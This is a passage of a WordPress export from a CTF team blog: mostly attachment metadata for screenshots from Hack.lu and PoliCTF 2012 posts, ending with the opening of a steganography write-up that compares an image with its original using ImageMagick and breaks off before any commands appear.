			<wp:meta_value><![CDATA[a:6:{s:5:"width";s:4:"1366";s:6:"height";s:3:"768";s:14:"hwstring_small";s:23:"height='71' width='128'";s:4:"file";s:43:"2012/10/Screenshot-at-2012-10-28-030139.png";s:5:"sizes";a:6:{s:9:"thumbnail";a:3:{s:4:"file";s:43:"Screenshot-at-2012-10-28-030139-150x150.png";s:5:"width";s:3:"150";s:6:"height";s:3:"150";}s:6:"medium";a:3:{s:4:"file";s:43:"Screenshot-at-2012-10-28-030139-300x168.png";s:5:"width";s:3:"300";s:6:"height";s:3:"168";}s:5:"large";a:3:{s:4:"file";s:44:"Screenshot-at-2012-10-28-030139-1024x575.png";s:5:"width";s:4:"1024";s:6:"height";s:3:"575";}s:14:"post-thumbnail";a:3:{s:4:"file";s:44:"Screenshot-at-2012-10-28-030139-1000x288.png";s:5:"width";s:4:"1000";s:6:"height";s:3:"288";}s:13:"large-feature";a:3:{s:4:"file";s:44:"Screenshot-at-2012-10-28-030139-1000x288.png";s:5:"width";s:4:"1000";s:6:"height";s:3:"288";}s:13:"small-feature";a:3:{s:4:"file";s:43:"Screenshot-at-2012-10-28-030139-500x281.png";s:5:"width";s:3:"500";s:6:"height";s:3:"281";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}}]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Screenshot at 2012-10-28 03:01:42</title>
		<link>http://nandynarwhals.org/2012/10/28/hack-lu-ctf-2012-mini-zombie-business/screenshot-at-2012-10-28-030142/</link>
		<pubDate>Sun, 28 Oct 2012 07:40:44 +0000</pubDate>
		<dc:creator>amon</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/wp-content/uploads/2012/10/Screenshot-at-2012-10-28-030142.png</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>173</wp:post_id>
		<wp:post_date>2012-10-28 15:40:44</wp:post_date>
		<wp:post_date_gmt>2012-10-28 07:40:44</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>screenshot-at-2012-10-28-030142</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>159</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<wp:attachment_url>http://nandynarwhals.org/wp-content/uploads/2012/10/Screenshot-at-2012-10-28-030142.png</wp:attachment_url>
		<wp:postmeta>
			<wp:meta_key>_wp_attached_file</wp:meta_key>
			<wp:meta_value><![CDATA[2012/10/Screenshot-at-2012-10-28-030142.png]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
			<wp:meta_value><![CDATA[a:6:{s:5:"width";s:4:"1366";s:6:"height";s:3:"768";s:14:"hwstring_small";s:23:"height='71' width='128'";s:4:"file";s:43:"2012/10/Screenshot-at-2012-10-28-030142.png";s:5:"sizes";a:6:{s:9:"thumbnail";a:3:{s:4:"file";s:43:"Screenshot-at-2012-10-28-030142-150x150.png";s:5:"width";s:3:"150";s:6:"height";s:3:"150";}s:6:"medium";a:3:{s:4:"file";s:43:"Screenshot-at-2012-10-28-030142-300x168.png";s:5:"width";s:3:"300";s:6:"height";s:3:"168";}s:5:"large";a:3:{s:4:"file";s:44:"Screenshot-at-2012-10-28-030142-1024x575.png";s:5:"width";s:4:"1024";s:6:"height";s:3:"575";}s:14:"post-thumbnail";a:3:{s:4:"file";s:44:"Screenshot-at-2012-10-28-030142-1000x288.png";s:5:"width";s:4:"1000";s:6:"height";s:3:"288";}s:13:"large-feature";a:3:{s:4:"file";s:44:"Screenshot-at-2012-10-28-030142-1000x288.png";s:5:"width";s:4:"1000";s:6:"height";s:3:"288";}s:13:"small-feature";a:3:{s:4:"file";s:43:"Screenshot-at-2012-10-28-030142-500x281.png";s:5:"width";s:3:"500";s:6:"height";s:3:"281";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}}]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Big Zombie Business.tar</title>
		<link>http://nandynarwhals.org/2012/10/28/hack-lu-ctf-2012-big-zombie-business/big-zombie-business-tar/</link>
		<pubDate>Sun, 28 Oct 2012 09:10:44 +0000</pubDate>
		<dc:creator>amon</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/wp-content/uploads/2012/10/Big-Zombie-Business.tar.gz</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>177</wp:post_id>
		<wp:post_date>2012-10-28 17:10:44</wp:post_date>
		<wp:post_date_gmt>2012-10-28 09:10:44</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>big-zombie-business-tar</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>176</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<wp:attachment_url>http://nandynarwhals.org/wp-content/uploads/2012/10/Big-Zombie-Business.tar.gz</wp:attachment_url>
		<wp:postmeta>
			<wp:meta_key>_wp_attached_file</wp:meta_key>
			<wp:meta_value><![CDATA[2012/10/Big-Zombie-Business.tar.gz]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
			<wp:meta_value><![CDATA[a:0:{}]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Screenshot at 2012-10-28 17:08:45</title>
		<link>http://nandynarwhals.org/2012/10/28/hack-lu-ctf-2012-big-zombie-business/screenshot-at-2012-10-28-170845/</link>
		<pubDate>Sun, 28 Oct 2012 09:11:06 +0000</pubDate>
		<dc:creator>amon</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/wp-content/uploads/2012/10/Screenshot-at-2012-10-28-170845.png</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>178</wp:post_id>
		<wp:post_date>2012-10-28 17:11:06</wp:post_date>
		<wp:post_date_gmt>2012-10-28 09:11:06</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>screenshot-at-2012-10-28-170845</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>176</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<wp:attachment_url>http://nandynarwhals.org/wp-content/uploads/2012/10/Screenshot-at-2012-10-28-170845.png</wp:attachment_url>
		<wp:postmeta>
			<wp:meta_key>_wp_attached_file</wp:meta_key>
			<wp:meta_value><![CDATA[2012/10/Screenshot-at-2012-10-28-170845.png]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
			<wp:meta_value><![CDATA[a:6:{s:5:"width";s:4:"1366";s:6:"height";s:3:"768";s:14:"hwstring_small";s:23:"height='71' width='128'";s:4:"file";s:43:"2012/10/Screenshot-at-2012-10-28-170845.png";s:5:"sizes";a:6:{s:9:"thumbnail";a:3:{s:4:"file";s:43:"Screenshot-at-2012-10-28-170845-150x150.png";s:5:"width";s:3:"150";s:6:"height";s:3:"150";}s:6:"medium";a:3:{s:4:"file";s:43:"Screenshot-at-2012-10-28-170845-300x168.png";s:5:"width";s:3:"300";s:6:"height";s:3:"168";}s:5:"large";a:3:{s:4:"file";s:44:"Screenshot-at-2012-10-28-170845-1024x575.png";s:5:"width";s:4:"1024";s:6:"height";s:3:"575";}s:14:"post-thumbnail";a:3:{s:4:"file";s:44:"Screenshot-at-2012-10-28-170845-1000x288.png";s:5:"width";s:4:"1000";s:6:"height";s:3:"288";}s:13:"large-feature";a:3:{s:4:"file";s:44:"Screenshot-at-2012-10-28-170845-1000x288.png";s:5:"width";s:4:"1000";s:6:"height";s:3:"288";}s:13:"small-feature";a:3:{s:4:"file";s:43:"Screenshot-at-2012-10-28-170845-500x281.png";s:5:"width";s:3:"500";s:6:"height";s:3:"281";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}}]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Screenshot at 2012-11-19 10:27:53</title>
		<link>http://nandynarwhals.org/2012/11/19/polictf-2012/screenshot-at-2012-11-19-102753/</link>
		<pubDate>Mon, 19 Nov 2012 05:07:09 +0000</pubDate>
		<dc:creator>amon</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/wp-content/uploads/2012/11/Screenshot-at-2012-11-19-102753.png</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>227</wp:post_id>
		<wp:post_date>2012-11-19 13:07:09</wp:post_date>
		<wp:post_date_gmt>2012-11-19 05:07:09</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>screenshot-at-2012-11-19-102753</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>226</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<wp:attachment_url>http://nandynarwhals.org/wp-content/uploads/2012/11/Screenshot-at-2012-11-19-102753.png</wp:attachment_url>
		<wp:postmeta>
			<wp:meta_key>_wp_attached_file</wp:meta_key>
			<wp:meta_value><![CDATA[2012/11/Screenshot-at-2012-11-19-102753.png]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
			<wp:meta_value><![CDATA[a:6:{s:5:"width";s:4:"1004";s:6:"height";s:3:"686";s:14:"hwstring_small";s:23:"height='87' width='128'";s:4:"file";s:43:"2012/11/Screenshot-at-2012-11-19-102753.png";s:5:"sizes";a:5:{s:9:"thumbnail";a:3:{s:4:"file";s:43:"Screenshot-at-2012-11-19-102753-150x150.png";s:5:"width";s:3:"150";s:6:"height";s:3:"150";}s:6:"medium";a:3:{s:4:"file";s:43:"Screenshot-at-2012-11-19-102753-300x204.png";s:5:"width";s:3:"300";s:6:"height";s:3:"204";}s:14:"post-thumbnail";a:3:{s:4:"file";s:44:"Screenshot-at-2012-11-19-102753-1000x288.png";s:5:"width";s:4:"1000";s:6:"height";s:3:"288";}s:13:"large-feature";a:3:{s:4:"file";s:44:"Screenshot-at-2012-11-19-102753-1000x288.png";s:5:"width";s:4:"1000";s:6:"height";s:3:"288";}s:13:"small-feature";a:3:{s:4:"file";s:43:"Screenshot-at-2012-11-19-102753-439x300.png";s:5:"width";s:3:"439";s:6:"height";s:3:"300";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}}]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Screenshot at 2012-11-19 13:28:09</title>
		<link>http://nandynarwhals.org/2012/11/19/polictf-2012/screenshot-at-2012-11-19-132809/</link>
		<pubDate>Mon, 19 Nov 2012 05:31:21 +0000</pubDate>
		<dc:creator>amon</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/wp-content/uploads/2012/11/Screenshot-at-2012-11-19-132809.png</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[Singapore Group at 19th place.]]></excerpt:encoded>
		<wp:post_id>231</wp:post_id>
		<wp:post_date>2012-11-19 13:31:21</wp:post_date>
		<wp:post_date_gmt>2012-11-19 05:31:21</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>screenshot-at-2012-11-19-132809</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>226</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<wp:attachment_url>http://nandynarwhals.org/wp-content/uploads/2012/11/Screenshot-at-2012-11-19-132809.png</wp:attachment_url>
		<wp:postmeta>
			<wp:meta_key>_wp_attached_file</wp:meta_key>
			<wp:meta_value><![CDATA[2012/11/Screenshot-at-2012-11-19-132809.png]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
			<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"976";s:6:"height";s:3:"653";s:14:"hwstring_small";s:23:"height='85' width='128'";s:4:"file";s:43:"2012/11/Screenshot-at-2012-11-19-132809.png";s:5:"sizes";a:5:{s:9:"thumbnail";a:3:{s:4:"file";s:43:"Screenshot-at-2012-11-19-132809-150x150.png";s:5:"width";s:3:"150";s:6:"height";s:3:"150";}s:6:"medium";a:3:{s:4:"file";s:43:"Screenshot-at-2012-11-19-132809-300x200.png";s:5:"width";s:3:"300";s:6:"height";s:3:"200";}s:14:"post-thumbnail";a:3:{s:4:"file";s:43:"Screenshot-at-2012-11-19-132809-976x288.png";s:5:"width";s:3:"976";s:6:"height";s:3:"288";}s:13:"large-feature";a:3:{s:4:"file";s:43:"Screenshot-at-2012-11-19-132809-976x288.png";s:5:"width";s:3:"976";s:6:"height";s:3:"288";}s:13:"small-feature";a:3:{s:4:"file";s:43:"Screenshot-at-2012-11-19-132809-448x300.png";s:5:"width";s:3:"448";s:6:"height";s:3:"300";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}}]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>challenge</title>
		<link>http://nandynarwhals.org/2012/11/19/polictf-2012-grab-bag-300/challenge/</link>
		<pubDate>Mon, 19 Nov 2012 05:58:54 +0000</pubDate>
		<dc:creator>amon</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/wp-content/uploads/2012/11/challenge.html</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>235</wp:post_id>
		<wp:post_date>2012-11-19 13:58:54</wp:post_date>
		<wp:post_date_gmt>2012-11-19 05:58:54</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>challenge</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>234</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<wp:attachment_url>http://nandynarwhals.org/wp-content/uploads/2012/11/challenge.html</wp:attachment_url>
		<wp:postmeta>
			<wp:meta_key>_wp_attached_file</wp:meta_key>
			<wp:meta_value><![CDATA[2012/11/challenge.html]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
			<wp:meta_value><![CDATA[a:0:{}]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Screenshot at 2012-11-19 13:59:40</title>
		<link>http://nandynarwhals.org/2012/11/19/polictf-2012-grab-bag-300/screenshot-at-2012-11-19-135940/</link>
		<pubDate>Mon, 19 Nov 2012 06:00:08 +0000</pubDate>
		<dc:creator>amon</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/wp-content/uploads/2012/11/Screenshot-at-2012-11-19-135940.png</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>236</wp:post_id>
		<wp:post_date>2012-11-19 14:00:08</wp:post_date>
		<wp:post_date_gmt>2012-11-19 06:00:08</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>screenshot-at-2012-11-19-135940</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>234</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<wp:attachment_url>http://nandynarwhals.org/wp-content/uploads/2012/11/Screenshot-at-2012-11-19-135940.png</wp:attachment_url>
		<wp:postmeta>
			<wp:meta_key>_wp_attached_file</wp:meta_key>
			<wp:meta_value><![CDATA[2012/11/Screenshot-at-2012-11-19-135940.png]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
			<wp:meta_value><![CDATA[a:6:{s:5:"width";s:4:"1366";s:6:"height";s:3:"768";s:14:"hwstring_small";s:23:"height='71' width='128'";s:4:"file";s:43:"2012/11/Screenshot-at-2012-11-19-135940.png";s:5:"sizes";a:6:{s:9:"thumbnail";a:3:{s:4:"file";s:43:"Screenshot-at-2012-11-19-135940-150x150.png";s:5:"width";s:3:"150";s:6:"height";s:3:"150";}s:6:"medium";a:3:{s:4:"file";s:43:"Screenshot-at-2012-11-19-135940-300x168.png";s:5:"width";s:3:"300";s:6:"height";s:3:"168";}s:5:"large";a:3:{s:4:"file";s:44:"Screenshot-at-2012-11-19-135940-1024x575.png";s:5:"width";s:4:"1024";s:6:"height";s:3:"575";}s:14:"post-thumbnail";a:3:{s:4:"file";s:44:"Screenshot-at-2012-11-19-135940-1000x288.png";s:5:"width";s:4:"1000";s:6:"height";s:3:"288";}s:13:"large-feature";a:3:{s:4:"file";s:44:"Screenshot-at-2012-11-19-135940-1000x288.png";s:5:"width";s:4:"1000";s:6:"height";s:3:"288";}s:13:"small-feature";a:3:{s:4:"file";s:43:"Screenshot-at-2012-11-19-135940-500x281.png";s:5:"width";s:3:"500";s:6:"height";s:3:"281";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}}]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Screenshot at 2012-11-19 03:26:27</title>
		<link>http://nandynarwhals.org/2012/11/19/polictf-2012-grab-bag-100/screenshot-at-2012-11-19-032627/</link>
		<pubDate>Mon, 19 Nov 2012 06:57:09 +0000</pubDate>
		<dc:creator>amon</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/wp-content/uploads/2012/11/Screenshot-at-2012-11-19-032627.png</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>249</wp:post_id>
		<wp:post_date>2012-11-19 14:57:09</wp:post_date>
		<wp:post_date_gmt>2012-11-19 06:57:09</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>screenshot-at-2012-11-19-032627</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>248</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<wp:attachment_url>http://nandynarwhals.org/wp-content/uploads/2012/11/Screenshot-at-2012-11-19-032627.png</wp:attachment_url>
		<wp:postmeta>
			<wp:meta_key>_wp_attached_file</wp:meta_key>
			<wp:meta_value><![CDATA[2012/11/Screenshot-at-2012-11-19-032627.png]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
			<wp:meta_value><![CDATA[a:6:{s:5:"width";s:4:"1366";s:6:"height";s:3:"768";s:14:"hwstring_small";s:23:"height='71' width='128'";s:4:"file";s:43:"2012/11/Screenshot-at-2012-11-19-032627.png";s:5:"sizes";a:6:{s:9:"thumbnail";a:3:{s:4:"file";s:43:"Screenshot-at-2012-11-19-032627-150x150.png";s:5:"width";s:3:"150";s:6:"height";s:3:"150";}s:6:"medium";a:3:{s:4:"file";s:43:"Screenshot-at-2012-11-19-032627-300x168.png";s:5:"width";s:3:"300";s:6:"height";s:3:"168";}s:5:"large";a:3:{s:4:"file";s:44:"Screenshot-at-2012-11-19-032627-1024x575.png";s:5:"width";s:4:"1024";s:6:"height";s:3:"575";}s:14:"post-thumbnail";a:3:{s:4:"file";s:44:"Screenshot-at-2012-11-19-032627-1000x288.png";s:5:"width";s:4:"1000";s:6:"height";s:3:"288";}s:13:"large-feature";a:3:{s:4:"file";s:44:"Screenshot-at-2012-11-19-032627-1000x288.png";s:5:"width";s:4:"1000";s:6:"height";s:3:"288";}s:13:"small-feature";a:3:{s:4:"file";s:43:"Screenshot-at-2012-11-19-032627-500x281.png";s:5:"width";s:3:"500";s:6:"height";s:3:"281";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}}]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>org</title>
		<link>http://nandynarwhals.org/2012/11/19/polictf-2012-bin-pwn-100/org/</link>
		<pubDate>Mon, 19 Nov 2012 07:50:57 +0000</pubDate>
		<dc:creator>amon</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/wp-content/uploads/2012/11/org.jpeg</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>260</wp:post_id>
		<wp:post_date>2012-11-19 15:50:57</wp:post_date>
		<wp:post_date_gmt>2012-11-19 07:50:57</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>org</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>259</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<wp:attachment_url>http://nandynarwhals.org/wp-content/uploads/2012/11/org.jpeg</wp:attachment_url>
		<wp:postmeta>
			<wp:meta_key>_wp_attached_file</wp:meta_key>
			<wp:meta_value><![CDATA[2012/11/org.jpeg]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
			<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"640";s:6:"height";s:3:"480";s:14:"hwstring_small";s:23:"height='96' width='128'";s:4:"file";s:16:"2012/11/org.jpeg";s:5:"sizes";a:5:{s:9:"thumbnail";a:3:{s:4:"file";s:16:"org-150x150.jpeg";s:5:"width";s:3:"150";s:6:"height";s:3:"150";}s:6:"medium";a:3:{s:4:"file";s:16:"org-300x225.jpeg";s:5:"width";s:3:"300";s:6:"height";s:3:"225";}s:14:"post-thumbnail";a:3:{s:4:"file";s:16:"org-640x288.jpeg";s:5:"width";s:3:"640";s:6:"height";s:3:"288";}s:13:"large-feature";a:3:{s:4:"file";s:16:"org-640x288.jpeg";s:5:"width";s:3:"640";s:6:"height";s:3:"288";}s:13:"small-feature";a:3:{s:4:"file";s:16:"org-400x300.jpeg";s:5:"width";s:3:"400";s:6:"height";s:3:"300";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}}]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>jcmarkerfixed</title>
		<link>http://nandynarwhals.org/2012/11/19/polictf-2012-bin-pwn-100/jcmarkerfixed/</link>
		<pubDate>Mon, 19 Nov 2012 08:22:36 +0000</pubDate>
		<dc:creator>amon</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/wp-content/uploads/2012/11/jcmarkerfixed.jpeg</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>265</wp:post_id>
		<wp:post_date>2012-11-19 16:22:36</wp:post_date>
		<wp:post_date_gmt>2012-11-19 08:22:36</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>jcmarkerfixed</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>259</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<wp:attachment_url>http://nandynarwhals.org/wp-content/uploads/2012/11/jcmarkerfixed.jpeg</wp:attachment_url>
		<wp:postmeta>
			<wp:meta_key>_wp_attached_file</wp:meta_key>
			<wp:meta_value><![CDATA[2012/11/jcmarkerfixed.jpeg]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
			<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"640";s:6:"height";s:3:"480";s:14:"hwstring_small";s:23:"height='96' width='128'";s:4:"file";s:26:"2012/11/jcmarkerfixed.jpeg";s:5:"sizes";a:5:{s:9:"thumbnail";a:3:{s:4:"file";s:26:"jcmarkerfixed-150x150.jpeg";s:5:"width";s:3:"150";s:6:"height";s:3:"150";}s:6:"medium";a:3:{s:4:"file";s:26:"jcmarkerfixed-300x225.jpeg";s:5:"width";s:3:"300";s:6:"height";s:3:"225";}s:14:"post-thumbnail";a:3:{s:4:"file";s:26:"jcmarkerfixed-640x288.jpeg";s:5:"width";s:3:"640";s:6:"height";s:3:"288";}s:13:"large-feature";a:3:{s:4:"file";s:26:"jcmarkerfixed-640x288.jpeg";s:5:"width";s:3:"640";s:6:"height";s:3:"288";}s:13:"small-feature";a:3:{s:4:"file";s:26:"jcmarkerfixed-400x300.jpeg";s:5:"width";s:3:"400";s:6:"height";s:3:"300";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}}]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Hack You 2012 – Halloween (STG200)</title>
		<link>http://nandynarwhals.org/2012/10/19/hack-you-2012-halloween-stg200/</link>
		<pubDate>Thu, 18 Oct 2012 17:11:01 +0000</pubDate>
		<dc:creator>amon</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/?p=52</guid>
		<description></description>
		<content:encoded><![CDATA[The only piece of the puzzle we were given was an image file:

<a href="http://nandynarwhals.org/wp-content/uploads/2012/10/stg200.png"><img class="alignnone size-large wp-image-53" title="stg200" src="http://nandynarwhals.org/wp-content/uploads/2012/10/stg200-1024x640.png" alt="" width="584" height="365" /></a>

The distinguishing feature for this picture is that there are a lot of blacks in the palette. That is, there are a lot of black spots for hiding secret messages in. The way we originally solved this was to obtain the original image. Using Google Images image search to identify where the original came from, we find a very promising site: http://onlyhdwallpapers.com/high-definition-wallpaper/09-desktop-hd-wallpaper-505315/.

Grabbing the file (http://nandynarwhals.org/wp-content/uploads/2012/10/nstg200.png), we then proceeded to use the ImageMagick suite that comes with Ubuntu to compare the two images.<!--more-->

[shell]
